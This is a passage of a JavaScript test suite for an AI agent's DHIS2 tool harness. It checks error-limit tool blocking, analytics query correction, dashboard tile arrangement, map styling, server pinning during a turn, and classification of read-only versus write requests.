      for (let i = 0; i < 3; i++) ctx.noteHttpErrorFromResult('manage_maps', e409, { action: 'create' });
      const all = ctx.httpErrorStopOrNull('manage_dashboards', { action: 'add_items' });
      truthy('6 errors in a row (any mix) still block every tool', all && all._blocked_lanes === 'all' && /Every tool is blocked/.test(all._hint));
      // Reporting Completeness Explorer thread (2026-11-10): a compile error on line 437 counted as "HTTP 437".
      d.httpErrorCount = 0; d.httpErrorHistory = [];
      for (let i = 0; i < 3; i++) ctx.noteHttpErrorFromResult('dhis2_query', e409, { method: 'GET', path: 'analytics?y=' + i });
      ctx.noteHttpErrorFromResult('manage_custom_app', { _error: 'JSX does not compile: app.jsx:437:10 Unexpected token', compile_errors: [{ file: 'app.jsx', line: 437 }] }, { action: 'preview' });
      ctx.noteHttpErrorFromResult('manage_custom_app', { _error: 'The code hard-codes 2 id(s) that do not exist on this server: abcdefghij1, abcdefghij2. 504 lines checked.' }, { action: 'preview' });
      truthy('a line number or count in an error text is not an HTTP status: a failed compile neither counts nor blocks the next preview',
        d.httpErrorCount === 3 && ctx.httpErrorStopOrNull('manage_custom_app', { action: 'preview' }) === null);
      ctx.noteHttpErrorFromResult('manage_custom_app', { _error: 'Could not read program abc: DHIS2 API 404: not found' }, { action: 'preview' });
      ctx.noteHttpErrorFromResult('manage_custom_app', { _error: 'Upload failed (HTTP 500)' }, { action: 'create' });
      truthy('…a status named as one in the text (DHIS2 API 404, HTTP 500) still counts', d.httpErrorCount === 5);
      {
        const h = ctx.healReportingRateDx;
        const dec = (r) => decodeURIComponent(r.path);
        truthy('dhis2_query writes a bare reporting-rate item with the data set named in the query, and drops the ds filter (409 E7124 / E7125)',
          dec(h('analytics?dimension=dx:REPORTING_RATE;REPORTING_RATE_ON_TIME&dimension=ou:ImspTQPwCqd;LEVEL-2&filter=pe:202510&filter=ds:BfMAe6Itzgt')) === 'analytics?dimension=dx:BfMAe6Itzgt.REPORTING_RATE;BfMAe6Itzgt.REPORTING_RATE_ON_TIME&dimension=ou:ImspTQPwCqd;LEVEL-2&filter=pe:202510'
          && dec(h('analytics?dimension=dx%3AREPORTING_RATE&dimension=ou%3AImspTQPwCqd&filter=pe%3A202510&dataSet=BfMAe6Itzgt')) === 'analytics?dimension=dx:BfMAe6Itzgt.REPORTING_RATE&dimension=ou:ImspTQPwCqd&filter=pe:202510'
          && /this server has reporting rates/.test(h('analytics?dimension=dx:REPORTING_RATE&filter=ds:BfMAe6Itzgt&filter=pe:202510').note));
        const noDs = h('analytics?dimension=dx:REPORTING_RATE&dimension=ou:ImspTQPwCqd&filter=pe:202510');
        truthy('…with no data set it is not sent and the answer gives the syntax; a right query and other endpoints are left alone',
          noDs.refusal && /<dataSetUid>\.<METRIC>/.test(noDs.refusal._hint)
          && !h('analytics?dimension=dx:BfMAe6Itzgt.REPORTING_RATE;Uvn6LCg7dVU&dimension=ou:ImspTQPwCqd&filter=pe:202510').healed
          && !h('analytics/events/aggregate/IpHINAT79UW?dimension=dx:REPORTING_RATE').healed && !h('analytics/events/aggregate/IpHINAT79UW?dimension=dx:REPORTING_RATE').refusal);
        const c = ctx.completeRegistrationsRefusal;
        truthy('completeDataSetRegistrations without a data set, an org unit or a period is answered locally (409 E2013 / E2006 / E2008)',
          /orgUnit=/.test(c('completeDataSetRegistrations?dataSet=BfMAe6Itzgt&period=202510&children=true')._error)
          && /dataSet=/.test(c('completeDataSetRegistrations?period=202510&orgUnit=ImspTQPwCqd')._error)
          && c('completeDataSetRegistrations?dataSet=BfMAe6Itzgt&period=202510&orgUnit=O6uvpzGd5pu&children=true') === null
          && c('completeDataSetRegistrations?dataSet=BfMAe6Itzgt&startDate=2025-10-01&endDate=2025-10-31&orgUnit=O6uvpzGd5pu') === null
          && c('dataSets?fields=id') === null);
      }
      const pre = (d.httpErrorCount = 3, d.httpErrorHistory = d.httpErrorHistory.slice(0, 3), ctx.preflightCheckCall('manage_dashboards', { action: 'arrange', dashboard_id: 'xEtKQVG44h0', order: [] }));
      truthy('preflight lets the unrelated dashboard write through after the read lane is stopped', pre === null || pre._scope !== 'http_error_limit_reached');
    } finally { d.httpErrorCount = saved.n; d.httpErrorHistory = saved.h; }
  }

  // 2. Saved chart / map / line-list / dashboard ids as analytics data items.
  const savedFetch = ctx.safeDhis2Fetch;
  const lookups = [];
  const meta = {
    visualizations: [
      { id: 'YMQkujLUT3e', displayName: 'Follow-up ANC visits with Hb below 11 (2026)', type: 'SINGLE_VALUE', dataDimensionItems: [{ dataDimensionItemType: 'PROGRAM_INDICATOR', programIndicator: { id: 'HtpydimkL0Y', displayName: 'RMNCH Follow-up ANC visits Hb<11' } }] },
      { id: 'XJruzyOnBWS', displayName: 'Registrations with a follow-up ANC visit with Hb below 11 (2026)', type: 'SINGLE_VALUE', dataDimensionItems: [{ dataDimensionItemType: 'PROGRAM_INDICATOR', programIndicator: { id: 'oVYCRemY0xE', displayName: 'RMNCH Registrations Hb<11' } }] },
    ],
    maps: [{ id: 'cL9y1QRKRRt', displayName: '% first ANC Hb<11 by district', mapViews: [{ dataDimensionItems: [{ dataDimensionItemType: 'PROGRAM_INDICATOR', programIndicator: { id: 'pfhawHn1Nss', displayName: '% first ANC Hb<11' } }] }] }],
    eventVisualizations: [{ id: 'tbzYTKkr8dJ', displayName: 'Follow-up ANC visits Hb<11', type: 'LINE_LIST' }],
    dashboards: [{ id: 'xEtKQVG44h0', displayName: 'Maternal Care and Follow-up' }],
  };
  const sent = [];
  ctx.safeDhis2Fetch = async (p) => {
    if (/^metadata\?visualizations=true/.test(p)) {
      lookups.push(p);
      const ids = (decodeURIComponent(p).match(/id:in:\[([^\]]*)\]/) || [, ''])[1].split(',');
      const pick = (arr) => arr.filter(o => ids.includes(o.id));
      return { visualizations: pick(meta.visualizations), maps: pick(meta.maps), eventVisualizations: pick(meta.eventVisualizations), dashboards: pick(meta.dashboards) };
    }
    if (/^programIndicators\?filter=id:in/.test(p)) { const ids = (decodeURIComponent(p).match(/\[([^\]]*)\]/) || [, ''])[1].split(','); return { programIndicators: ids.filter(id => ['HtpydimkL0Y', 'oVYCRemY0xE', 'pfhawHn1Nss'].includes(id)).map(id => ({ id })) }; }
    if (/^programs\?fields=id,displayName/.test(p)) return { programs: [{ id: 'WSGAb5XwJ3Y', displayName: 'WHO RMNCH Tracker' }] };
    if (/^programs\/WSGAb5XwJ3Y\?fields=programStages/.test(p)) return { programStages: [{ id: 'edqlbukwRfQ' }] };
    if (/^analytics/.test(p)) { sent.push(p); return { headers: [], rows: [['HtpydimkL0Y', '2026', '1156'], ['oVYCRemY0xE', '2026', '202']] }; }
    return {};
  };
  try {
    run('_savedObjectByUid.clear()');
    const h = await ctx.healSavedObjectAsDataItem('analytics?dimension=dx%3AYMQkujLUT3e%3BXJruzyOnBWS&dimension=pe%3A2026&filter=ou%3AImspTQPwCqd');
    truthy('/analytics with two KPI-tile visualization ids in dx: swapped for the program indicators they plot, with a note naming both tiles',
      h.healed && /dimension=dx:HtpydimkL0Y;oVYCRemY0xE&/.test(h.path) && /YMQkujLUT3e/.test(h.note) && /XJruzyOnBWS/.test(h.note) && /oVYCRemY0xE/.test(h.note));
    const e = await ctx.healSavedObjectAsDataItem('analytics/enrollments/aggregate/WSGAb5XwJ3Y?dimension=dx:YMQkujLUT3e;XJruzyOnBWS&dimension=ou:ImspTQPwCqd');
    const one = await ctx.healSavedObjectAsDataItem('analytics/enrollments/aggregate/WSGAb5XwJ3Y?dimension=XJruzyOnBWS&dimension=ou:ImspTQPwCqd');
    truthy('enrollment analytics: the same ids (dx: list and a bare dimension=) are swapped the same way, from the cache (one lookup so far)',
      e.healed && /dimension=dx:HtpydimkL0Y;oVYCRemY0xE/.test(e.path) && one.healed && /dimension=oVYCRemY0xE&/.test(one.path) && lookups.length === 1);
    const ll = await ctx.healSavedObjectAsDataItem('analytics?dimension=dx:tbzYTKkr8dJ&dimension=pe:2026');
    const db = await ctx.healSavedObjectAsDataItem('analytics?dimension=dx:xEtKQVG44h0&dimension=pe:2026');
    truthy('a line-list id is refused with manage_line_lists validate, a dashboard id with manage_dashboards get — neither is sent',
      ll.refusal?._scope === 'saved_object_as_data_item' && /validate/.test(ll.refusal._hint) && /manage_dashboards\(action="get"/.test(db.refusal?._hint || ''));
    const before = lookups.length;
    const plain = await ctx.healSavedObjectAsDataItem('analytics?dimension=dx:pfhawHn1Nss&dimension=pe:2026');
    const plain2 = await ctx.healSavedObjectAsDataItem('analytics?dimension=dx:pfhawHn1Nss&dimension=pe:2026&filter=ou:ImspTQPwCqd');
    const noDx = await ctx.healSavedObjectAsDataItem('analytics?dimension=ou:ImspTQPwCqd;LEVEL-2&dimension=pe:2026');
    truthy('a real data item is left alone (and looked up only once); a query with no data items makes no lookup',
      !plain.healed && !plain.refusal && !plain2.healed && lookups.length === before + 1 && !noDx.healed);
    ctx.safeDhis2Fetch = async (p) => (/^metadata/.test(p) ? { _error: 'DHIS2 API 500', _status: 500 } : {});
    run('_savedObjectByUid.clear()');
    const down = await ctx.healSavedObjectAsDataItem('analytics?dimension=dx:YMQkujLUT3e&dimension=pe:2026');
    truthy('a failed lookup never blocks the query', !down.healed && !down.refusal);
    // End to end through dhis2_query with the thread's exact first failing call.
    ctx.safeDhis2Fetch = savedFetch;
    run('_savedObjectByUid.clear()');
    const sf2 = ctx.safeDhis2Fetch;
    ctx.safeDhis2Fetch = async (p, o) => {
      if (/^metadata\?visualizations=true|^analytics|^programIndicators|^programs/.test(p)) {
        if (/^metadata\?visualizations=true/.test(p)) return { visualizations: meta.visualizations.slice(), maps: [], eventVisualizations: [], dashboards: [] };
        if (/^analytics/.test(p)) { sent.push(p); return { headers: [], rows: [['HtpydimkL0Y', '2026', '1156'], ['oVYCRemY0xE', '2026', '202']] }; }
        return {};
      }
      return sf2(p, o);
    };
    const q = await ctx.executeTool('dhis2_query', { method: 'GET', path: 'analytics?dimension=dx%3AYMQkujLUT3e%3BXJruzyOnBWS&dimension=pe%3A2026&filter=ou%3AImspTQPwCqd' });
    truthy('dhis2_query: the thread\'s first 409 query now returns the two tiles\' values and says what was corrected (_query_corrected, _sent_path)',
      q && Array.isArray(q.rows) && q.rows.length === 2 && /HtpydimkL0Y;oVYCRemY0xE/.test(q._sent_path || '') && /dashboard tile, not a data item/.test(q._query_corrected || '') && /dx:HtpydimkL0Y;oVYCRemY0xE/.test(sent[sent.length - 1]));
  } finally { ctx.safeDhis2Fetch = savedFetch; run('_savedObjectByUid.clear()'); }

  // 3. Same query, parameters reordered = the same call for the loop guards.
  truthy('a query with reordered parameters has the same call signature',
    ctx.failedCallSignature('dhis2_query', { method: 'GET', path: 'analytics/events/aggregate/WSGAb5XwJ3Y?dimension=ou:ImspTQPwCqd&stage=WZbXY0S00lP&startDate=2026-01-01' })
      === ctx.failedCallSignature('dhis2_query', { method: 'GET', path: 'analytics/events/aggregate/WSGAb5XwJ3Y?stage=WZbXY0S00lP&startDate=2026-01-01&dimension=ou:ImspTQPwCqd' }));

  // 4. Dashboard: insert at a place, reorder, no same-name duplicate.
  const savedD = { sdf: ctx.safeDhis2Fetch, wa: d.writeAuth, consent: d.harnessSkipBackupConsent, base: d.baseUrl };
  d.writeAuth = { scope: 'broad', reason: 'verify' };
  d.harnessSkipBackupConsent = true;
  d.baseUrl = d.baseUrl || 'https://verify.example/dhis';
  const viz = (id, name, type, rows, columns) => ({ id, displayName: name, type, rows, columns });
  const vizList = [
    ...['KpiA', 'KpiB', 'KpiC', 'KpiD'].map((k) => viz(`Viz${k}0000`.slice(0, 11), `KPI ${k}`, 'SINGLE_VALUE', [], [{ dimension: 'dx', items: [{ id: 'a' }] }])),
    viz('VizChart000', 'Monthly records', 'COLUMN', [{ dimension: 'pe', items: Array.from({ length: 12 }, (_, i) => ({ id: `2026${String(i + 1).padStart(2, '0')}` })) }], [{ dimension: 'dx', items: [{ id: 'a' }, { id: 'b' }, { id: 'c' }, { id: 'd' }, { id: 'e' }] }]),
    viz('VizPivot000', 'District summary', 'PIVOT_TABLE', [{ dimension: 'ou', items: [{ id: 'ImspTQPwCqd' }, { id: 'LEVEL-2' }] }], [{ dimension: 'dx', items: [{ id: 'a' }, { id: 'b' }] }]),
  ];
  const tiles0 = [
    ...[0, 15, 30, 45].map((x, i) => ({ id: `ItemKpi000${i}`, type: 'VISUALIZATION', x, y: 0, width: 15, height: 9, visualization: { id: vizList[i].id } })),
    { id: 'ItemChart00', type: 'VISUALIZATION', x: 0, y: 9, width: 60, height: 20, visualization: { id: 'VizChart000' } },
    { id: 'ItemPivot00', type: 'VISUALIZATION', x: 0, y: 29, width: 60, height: 25, visualization: { id: 'VizPivot000' } },
    { id: 'ItemList000', type: 'EVENT_VISUALIZATION', x: 0, y: 54, width: 60, height: 24, eventVisualization: { id: 'EvList00001' } },
    { id: 'ItemList001', type: 'EVENT_VISUALIZATION', x: 0, y: 78, width: 60, height: 24, eventVisualization: { id: 'EvList00002' } },
  ];
  let stored = JSON.parse(JSON.stringify(tiles0));
  const posts = [];
  ctx.safeDhis2Fetch = async (p, o = {}) => {
    if (o.method === 'POST' || o.method === 'PUT') {
      const body = typeof o.body === 'string' ? JSON.parse(o.body) : o.body;
      posts.push({ p, body });
      const dash = body?.dashboards?.[0];
      if (dash && !/importMode=VALIDATE/.test(p)) stored = dash.dashboardItems;
      return { status: 'OK', httpStatus: 'OK', response: { status: 'OK', stats: { created: 0, updated: 1, deleted: 0, ignored: 0, total: 1 }, typeReports: [] } };
    }
    if (/^dashboards\/DashMaps001\?fields=:owner/.test(p)) return { id: 'DashMaps001', name: 'Maternal Care and Follow-up', dashboardItems: JSON.parse(JSON.stringify(stored)) };
    if (/^dashboards\/DashMaps001\?fields=dashboardItems/.test(p)) return { dashboardItems: stored };
    if (/^dashboards\/DashMaps001\?fields=id,displayName/.test(p)) return { id: 'DashMaps001', displayName: 'Maternal Care and Follow-up', dashboardItems: stored.map(it => ({ ...it, ...(it.visualization ? { visualization: { ...it.visualization, displayName: 'V', type: 'SINGLE_VALUE', dataDimensionItems: [{ dataDimensionItemType: 'PROGRAM_INDICATOR', programIndicator: { id: 'HtpydimkL0Y', displayName: 'PI' } }] } } : {}) })) };
    if (/^dashboards\?filter=name:ilike/.test(p)) return { dashboards: [{ id: 'DashMaps001', name: 'Maternal Care and Follow-up' }] };
    if (/^visualizations\?filter=id:in/.test(p)) return { visualizations: vizList };
    if (/^eventVisualizations\?filter=id:in/.test(p)) return { eventVisualizations: [{ id: 'EvList00001', displayName: 'Registrations', type: 'LINE_LIST' }, { id: 'EvList00002', displayName: 'Low Hb visits', type: 'LINE_LIST' }] };
    if (/^maps\/(MapChoro001|MapBubble01)\?fields=id,displayName/.test(p)) return { id: p.slice(5, 16), displayName: 'Map' };
    if (/^organisationUnits\?filter=level:eq:2/.test(p)) return { pager: { total: 13 }, organisationUnits: [] };
    if (/^dataStore/.test(p)) return { status: 'OK' };
    return {};
  };
  const readingOrder = () => ctx.dashboardReadingOrder(stored).map(it => it.id || it.map?.id);
  const wellFormed = (items) => items.every((a, i) => items.every((b, j) => i === j || a.y + a.height <= b.y || b.y + b.height <= a.y || a.x + a.width <= b.x || b.x + b.width <= a.x));
  try {
    const badAnchor = await ctx.executeTool('manage_dashboards', { action: 'add_items', dashboard_id: 'DashMaps001', insert_after_item_id: 'VizPivot000', items: [{ type: 'MAP', map_id: 'MapChoro001' }] });
    truthy('add_items with a chart id instead of a tile id as the anchor is refused, listing the tile ids, and nothing is written',
      /No tile with item_id "VizPivot000"/.test(badAnchor._error || '') && /ItemPivot00/.test(badAnchor._hint || '') && posts.length === 0);
    const ins = await ctx.executeTool('manage_dashboards', { action: 'add_items', dashboard_id: 'DashMaps001', insert_after_item_id: 'ItemPivot00', items: [{ type: 'MAP', map_id: 'MapChoro001' }, { type: 'MAP', map_id: 'MapBubble01' }, { type: 'TEXT', text: 'About this dashboard' }] });
    const order = ctx.dashboardReadingOrder(stored);
    const at = (id) => order.findIndex(it => it.id === id);
    const maps = order.filter(it => it.type === 'MAP');
    truthy('add_items insert_after_item_id puts the two maps and the note between the district table and the line lists; the maps share a row, KPIs keep 15 columns, nothing overlaps',
      ins && ins.success && at('ItemPivot00') === 5 && order[6].type === 'MAP' && order[7].type === 'MAP' && order[8].type === 'TEXT' && at('ItemList000') === 9
      && maps.length === 2 && maps[0].y === maps[1].y && maps[0].width === 30 && order.slice(0, 4).every(it => it.width === 15 && it.y === 0) && wellFormed(stored) && Array.isArray(ins.tile_rows) && /after tile ItemPivot00/.test(ins.inserted || ''));
    const textId = order[8].id;
    const ar = await ctx.executeTool('manage_dashboards', { action: 'arrange', dashboard_id: 'DashMaps001', order: [textId, 'ItemKpi0000', 'ItemKpi0001', 'ItemKpi0002', 'ItemKpi0003', 'ItemChart00', 'ItemPivot00'] });
    const o2 = ctx.dashboardReadingOrder(stored).map(it => it.id);
    truthy('arrange order puts the tiles in the given reading order; the tiles it leaves out follow in their current order and are reported',
      ar && ar.success && o2[0] === textId && o2[1] === 'ItemKpi0000' && o2[6] === 'ItemPivot00' && stored.find(it => it.id === o2[7]).type === 'MAP' && o2[9] === 'ItemList000' && o2[10] === 'ItemList001' && /4 tile\(s\) were not in order/.test(ar._unlisted_tiles || '') && wellFormed(stored));
    const badOrder = await ctx.executeTool('manage_dashboards', { action: 'arrange', dashboard_id: 'DashMaps001', order: ['VizChart000'] });
    truthy('arrange refuses an order with a chart id instead of a tile id', /No tile with item_id VizChart000/.test(badOrder._error || ''));
    const nPosts = posts.length;
    const dup = await ctx.executeTool('manage_dashboards', { action: 'create_dashboard', dashboard: { name: 'maternal care and follow-up ' }, items: [{ visualization_id: 'VizChart000' }] });
    truthy('create_dashboard with the name of an existing dashboard is refused (case and spaces ignored), pointing to add_items / arrange — nothing is written',
      dup._scope === 'dashboard_name_exists' && dup._existing_dashboard?.id === 'DashMaps001' && /insert_after_item_id/.test(dup._hint) && /arrange/.test(dup._hint) && posts.length === nPosts);
    const g = await ctx.executeTool('manage_dashboards', { action: 'get', dashboard_id: 'DashMaps001' });
    truthy('get lists tiles in reading order with position, and each chart\'s data_items',
      g && g.success && g.items[0].position === 1 && g.items[0].id === textId && g.items.find(it => it.visualization)?.visualization?.data_items?.[0]?.id === 'HtpydimkL0Y' && /TILE id/.test(g._items_note || ''));
  } finally { ctx.safeDhis2Fetch = savedD.sdf; d.writeAuth = savedD.wa; d.harnessSkipBackupConsent = savedD.consent; d.baseUrl = savedD.base; }
  // 5. Maps: colour scale saved as hex colours, boundary layer, no-data colour.
  {
    const typeMap = { pfhawHn1Nss: 'PROGRAM_INDICATOR', ekz3G3R5noc: 'PROGRAM_INDICATOR' };
    const bub = ctx.buildMapObject({ name: 'Facilities', data_item: 'ekz3G3R5noc', org_unit_level: 4, org_units: ['ImspTQPwCqd'], period: '2026', thematic_map_type: 'BUBBLE', boundary_level: 2, program_id: 'WSGAb5XwJ3Y' }, typeMap);
    const th = bub.map.mapViews.find(v => v.layer === 'thematic'), bd = bub.map.mapViews[0];
    truthy('maps: the default colour scale is saved as 5 hex colours (a bare "YlOrRd" draws every bubble black); boundary_level adds a level-2 outline layer beneath the data under the same parent',
      th.colorScale.split(',').length === 5 && th.colorScale.split(',').every(c => /^#[0-9a-f]{6}$/i.test(c)) && th.classes === 5
      && bd.layer === 'boundary' && bd.organisationUnitLevels[0] === 2 && bd.organisationUnits[0].id === 'ImspTQPwCqd' && /LEVEL-2/.test(JSON.stringify(bd.rows)) && bub.map.mapViews[1] === th);
    const ch = ctx.buildMapObject({ name: 'Districts', data_item: 'pfhawHn1Nss', org_unit_level: 2, period: '2026', color_scale: 'blues', classes: 3, no_data_color: '#D9D9D9' }, typeMap);
    const own = ctx.buildMapObject({ name: 'D', data_item: 'pfhawHn1Nss', org_unit_level: 2, color_scale: '#fee5d9,#fcae91,#fb6a4a,#cb181d' }, typeMap);
    const badScale = ctx.buildMapObject({ name: 'D', data_item: 'pfhawHn1Nss', org_unit_level: 2, color_scale: 'Rainbow' }, typeMap);
    const badNoData = ctx.buildMapObject({ name: 'D', data_item: 'pfhawHn1Nss', org_unit_level: 2, no_data_color: 'grey' }, typeMap);
    truthy('maps: a named scale in any case gives that many classes, a hex list is kept (4 classes), no_data_color is saved; an unknown scale or a non-hex no-data colour is refused',
      ch.map.mapViews.length === 1 && ch.map.mapViews[0].colorScale === '#f7fbff,#6baed6,#08306b' && ch.map.mapViews[0].noDataColor === '#D9D9D9'
      && own.map.mapViews[0].colorScale === '#fee5d9,#fcae91,#fb6a4a,#cb181d' && own.map.mapViews[0].classes === 4 && /Rainbow/.test(badScale._error || '') && /no_data_color/.test(badNoData._error || ''));
    // OSM Light's CartoDB tiles now draw "API KEY REQUIRED" over every map (8081, 2026-11-08).
    truthy('maps: the basemap defaults to openStreetMap (OSM Detailed), not osmLight; "osmDetailed" / "OSM Detailed" mean openStreetMap; an explicit osmLight is kept',
      ch.map.basemap === 'openStreetMap'
      && ctx.buildMapObject({ name: 'D', data_item: 'pfhawHn1Nss', org_unit_level: 2, basemap: 'osmDetailed' }, typeMap).map.basemap === 'openStreetMap'
      && ctx.buildMapObject({ name: 'D', data_item: 'pfhawHn1Nss', org_unit_level: 2, basemap: 'OSM Detailed' }, typeMap).map.basemap === 'openStreetMap'
      && ctx.buildMapObject({ name: 'D', data_item: 'pfhawHn1Nss', org_unit_level: 2, basemap: 'osmLight' }, typeMap).map.basemap === 'osmLight');
    // OSM Detailed over plain http: a 301 to https without CORS → no background (Chrome, 8081).
    const savedBase = d.baseUrl, savedSdf = ctx.safeDhis2Fetch;
    try {
      let setting = '';
      ctx.safeDhis2Fetch = async (p) => (p.startsWith('systemSettings/keyDefaultBaseMap') ? { keyDefaultBaseMap: setting } : { _error: 'x' });
      d.baseUrl = 'https://play.im.dhis2.org/stable-2-42-7-1';
      const onHttps = await ctx.defaultMapBasemap();
      d.baseUrl = 'http://localhost:8081';
      const onHttp = await ctx.defaultMapBasemap();
      setting = 'bingLight';
      const adminSet = await ctx.defaultMapBasemap();
      truthy('maps: the default basemap is the admin\'s keyDefaultBaseMap, else OSM Detailed over https and OSM Light over plain http (OSM Detailed cannot load there), each with a note on what the user will see',
        onHttps === 'openStreetMap' && onHttp === 'osmLight' && adminSet === 'bingLight'
        && /no keyless basemap loads/.test(ctx.mapBasemapNote('osmLight') || '') && /cannot load/.test(ctx.mapBasemapNote('openStreetMap') || '') && ctx.mapBasemapNote('bingLight') === null
        && (d.baseUrl = 'https://x.org', /use "openStreetMap"/.test(ctx.mapBasemapNote('osmLight') || '') && ctx.mapBasemapNote('openStreetMap') === null));
    } finally { d.baseUrl = savedBase; ctx.safeDhis2Fetch = savedSdf; }
  }
  truthy('the manage_dashboards schema offers insert_after_item_id / insert_before_item_id and arrange order',
    (() => { const t = vm.runInContext('TOOLS', ctx).find(x => x.function.name === 'manage_dashboards'); const p = t.function.parameters.properties; return p.insert_after_item_id && p.insert_before_item_id && p.order && /insert_after_item_id/.test(t.function.description); })());
}

// Malaria Case Explorer (2026-11-01, play 2.42.7): the app showed 0 of
// 100,332 events — tracker/events with orgUnit=<country> and no orgUnitMode
// (DHIS2 defaults to SELECTED). And its first preview called the program's
// real ids "not on this server": the connection follows the focused tab, and
// a tab on another server mid-turn moved the rest of the turn there.
async function runAppOrgUnitAndServerPinChecks() {
  console.log('\nCustom-app tracker org-unit mode + a running request stays on its server:');
  const truthy = (label, got) => (got ? ok(label) : bad(`${label} => ${JSON.stringify(got)}`));
  const d = ctx.__dhis2();
  const kitMeta = JSON.parse(fs.readFileSync(path.join(ROOT, 'libs/d2-kit/KIT_VERSION.json'), 'utf8'));
  const lint = (src) => ctx.lintCustomAppCode({ 'app.jsx': ctx.compileCustomAppFile('app.jsx', src).code }, 'app', kitMeta).errors.filter((e) => /orgUnitMode/.test(e.message));
  const root = "\nReactDOMClient.createRoot(document.getElementById('root')).render(<A />);";
  const Q = (extra) => `const { useDataQuery } = D2Runtime;\nconst EVENTS = { list: { resource: 'tracker/events', params: (v) => ({ program: v.p, orgUnit: v.ou${extra}, page: v.page, pageSize: 50, totalPages: true, fields: 'event,orgUnit,occurredAt' }) } };\nconst A = () => { const { data } = useDataQuery(EVENTS, { variables: { p: 'x', ou: 'y', page: 1 } }); return null; };` + root;
  truthy('the thread\'s query (tracker/events with orgUnit, no orgUnitMode) is refused, naming DESCENDANTS and the 0-records symptom',
    lint(Q('')).some((e) => /DESCENDANTS/.test(e.message) && /shows 0 records/.test(e.message)));
  truthy('…passes with orgUnitMode DESCENDANTS or an explicit SELECTED; an orgUnit read only in fields or from a record is not flagged',
    !lint(Q(", orgUnitMode: 'DESCENDANTS'")).length && !lint(Q(", orgUnitMode: 'SELECTED'")).length
    && !lint("const { useDataQuery } = D2Runtime;\nconst E = { l: { resource: 'tracker/events', params: { program: 'x', orgUnitMode: 'ACCESSIBLE', fields: 'event,orgUnit' } } };\nconst A = () => { const { data } = useDataQuery(E); const ou = data && data.l.events[0].orgUnit; return null; };" + root).length);
  truthy('a URL-string query (tracker/enrollments?orgUnit=…) without orgUnitMode is refused too',
    lint("const { useDataQuery } = D2Runtime;\nconst E = { l: { resource: 'tracker/enrollments?orgUnit=abc&program=x' } };\nconst A = () => { useDataQuery(E); return null; };" + root).length === 1);
  const cheat = vm.runInContext('TOOLS', ctx).find((t) => t.function.name === 'dhis2_query').function.description;
  truthy('the dhis2_query tracker examples carry orgUnitMode=DESCENDANTS', /tracker\/events\?[^\n]*orgUnitMode=DESCENDANTS/.test(cheat) && !/tracker\/events\?program=\{id\}&programStage=\{id\}&orgUnit=\{id\}&fields/.test(cheat));

  // The UID refusal names the server it checked.
  {
    const saved = ctx.safeDhis2Fetch;
    ctx.safeDhis2Fetch = async () => ({ system: { version: '2.42.5' } });
    try {
      const r = await ctx.checkCustomAppUids(['VBqh0ynB2wv']);
      truthy('the app id check reports which server it asked', r.unknown.length === 1 && r.server === d.baseUrl);
    } finally { ctx.safeDhis2Fetch = saved; }
  }

  // A running request stays on its server.
  const saved = { base: d.baseUrl, connected: d.connected, init: ctx.initializeFromUrl };
  const switched = [];
  d.baseUrl = 'https://play.im.dhis2.org/stable-2-42-7-1'; d.connected = true;
  try {
    ctx.beginServerPinnedTurn();
    const held = await ctx.initializeFromUrlNow('http://localhost:8081/dhis-web-capture/index.html#/');
    truthy('during a turn, a focused tab on another DHIS2 server does not move the connection (held, base URL unchanged)',
      held && held.deferred && /localhost:8081/.test(held.deferred) && d.baseUrl === 'https://play.im.dhis2.org/stable-2-42-7-1');
    const same = ctx.heldServerSwitch('https://play.im.dhis2.org/stable-2-42-7-1', 'https://play.im.dhis2.org/stable-2-42-7-1/apps/capture');
    truthy('…same-server navigation during the turn is not held', same === null);
    vm.runInContext('initializeFromUrl = (u) => { globalThis.__switchedTo = u; return Promise.resolve({ success: true }); };', ctx);
    await ctx.endServerPinnedTurn();
    truthy('when the turn ends, the held switch to the focused tab\'s server is applied', vm.runInContext('globalThis.__switchedTo', ctx) === 'http://localhost:8081/dhis-web-capture/index.html#/');
    vm.runInContext('globalThis.__switchedTo = null;', ctx);
    const free = ctx.heldServerSwitch('http://localhost:8081', 'http://localhost:8081/dhis-web-capture/');
    truthy('…and with no turn running, switching servers works as before', free === null);
  } finally {
    vm.runInContext('initializeFromUrl = __savedInit;', Object.assign(ctx, { __savedInit: saved.init }));
    d.baseUrl = saved.base; d.connected = saved.connected;
  }
  truthy('runAgenticLoop pins the server for the turn and applies a held switch at the end',
    (() => { const src = vm.runInContext('runAgenticLoop.toString()', ctx); return /beginServerPinnedTurn\(\)/.test(src) && /endServerPinnedTurn\(\)/.test(src); })());
}

// Inpatient Outcomes Explorer (2026-11-01, play 2.42.7): "Create an app …
// Keep the app read-only. Include helpful loading, error, invalid-filter, and
// empty-result messages." was classified read-only ("read-only" anywhere) AND
// a save-failure report ("loading, error"), so the save-diagnosis strip
// withheld every write tool and the model said manage_custom_app was missing.
async function runAppRequestRoutingChecks() {
  console.log('\nApp requests that describe a read-only app and its error messages are still build requests:');
  const truthy = (label, got) => (got ? ok(label) : bad(`${label} => ${JSON.stringify(got)}`));
  const d = ctx.__dhis2();
  const ask = 'Create an app called “Inpatient Outcomes Explorer” for the Inpatient morbidity and mortality program. Use only program metadata to identify the fields. Do not fetch, sample, open, or inspect patient records while building or checking the app. Include a “Needs review” view. Keep the app read-only. Include helpful loading, error, invalid-filter, and empty-result messages. Keep missing answers separate from zero or No. Do not create test patient records in DHIS2 or validate against existing records. When finished, give me the app URL.';
  const savedWa = d.writeAuth;
  try {
    d.writeAuth = ctx.classifyWriteAuthorization(ask);
    const tools = ctx.getContextualTools({ appType: 'Dashboard' }, ask, false, ask).map((t) => t.function.name);
    truthy('the thread\'s request is a write request, not a save-failure report, and manage_custom_app is offered (the strip left 8 read tools before)',
      d.writeAuth.scope !== 'read_only' && !ctx.reportsSaveFailure(ask) && !ctx.isSaveDiagnosisReadOnly(ask) && tools.includes('manage_custom_app') && tools.length > 8);
    const sp = await ctx.buildSystemPrompt(ask, false, false, ask);
    truthy('…and its system prompt has the custom-app section, not "Save / Load failure diagnosis"', /manage_custom_app/.test(sp) && !/Save \/ Load failure diagnosis/.test(sp));
  } finally { d.writeAuth = savedWa; }
  const scope = (t) => ctx.classifyWriteAuthorization(t).scope;
  truthy('"read-only" about the request still means no changes ("read-only please", "stay read-only", "work in read-only mode"); about the app being built it does not',
    scope('Check the rules on this program, read-only please.') === 'read_only' && scope('Fix nothing — stay read-only and tell me what is wrong.') === 'read_only'
    && scope('Work in read-only mode and list the stages.') === 'read_only' && scope('Create an app that lists events. Keep the app read-only.') !== 'read_only');
  truthy('"no changes" alone still refuses; "no changes to <object>" inside a build request is a constraint, not a refusal',
